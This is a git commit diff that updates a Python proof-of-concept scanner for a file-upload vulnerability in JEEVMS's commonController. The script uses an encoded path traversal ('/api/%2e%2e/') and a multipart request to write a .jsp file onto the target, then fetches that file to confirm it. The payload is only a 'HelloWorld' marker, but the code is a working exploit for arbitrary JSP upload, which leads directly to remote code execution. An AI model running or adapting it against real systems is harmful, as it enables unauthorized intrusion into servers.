3730522f920ccb9be522f10bcd0749e3688bcc28
myh0st <1293348082@qq.com>
2024-12-27 17:44:22 +0800

    Update JEEVMS-commonController-upload.py

--- JEEVMS-commonController-upload.py
+++ JEEVMS-commonController-upload.py
@@ -5,26 +5,24 @@
 import sys
 import requests
 import re
-import urllib
 import urllib3
 
 urllib3.disable_warnings()
 
 def verify(site):
-    target = site + "/api/../commonController.do?parserXml"
+    target = site + "/api/%2e%2e/commonController.do?parserXml"
     headers = {
         "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
         "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
     }
     filename = "vulntest"
     data = """------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; "name="name"\r\n\r\n{}.png\r\n------WebKitFormBoundarygcflwtei\r\nontent-Disposition: form-data; name="documentTitle"\r\n\r\nblank\r\n------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="file"; filename="{}.jsp"\r\nContent-Type: image/png\r\n\r\nHelloWorld\r\n------WebKitFormBoundarygcflwtei--""".format(filename,filename)
-    response = urllib.request.Request(target, headers=headers, method="POST", data=data.encode(), unverifiable=True)
-    res = urllib.request.urlopen(response)
-    status_code = res.getcode()
-    content = res.read().decode()
+    response = requests.post(target, headers=headers, data=data, verify=False)
+    status_code = response.status_code
+    content = response.text
     if status_code == 200 and 'jsonStr' in content and 'success' in content:
         result_url = site+'/{}.jsp'.format(filename)
-        response = requests.post(result_url, verify=False, headers=headers, data=data, timeout=15)
+        response = requests.get(result_url, verify=False, timeout=15)
         if response.status_code == 200 and 'HelloWorld' in response.text:
             return result_url
     return ""
